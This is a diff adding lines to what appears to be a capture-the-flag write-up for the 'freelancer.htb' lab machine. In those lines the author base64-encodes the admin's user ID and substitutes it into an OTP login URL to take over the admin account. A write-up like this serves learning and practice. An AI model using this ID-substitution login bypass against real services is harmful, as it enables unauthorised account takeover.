@@ -187,6 +187,18 @@ scanned 1 barcode symbols from 1 images in 0.01 seconds
 
 And now i see the last section is different
 
-```py
+```python
+echo 2 | base64            
+Mgo=
 ```
+
+To test my theory ill just take the admins ID `2` then encode it and replace `MTAwMTE=` with the new value
+
+```python
+http://freelancer.htb/accounts/login/otp/Mgo=/0889731ba95f3a9d08679a8d0392375d/
+```
+
+Leaving me with this
+
+
 
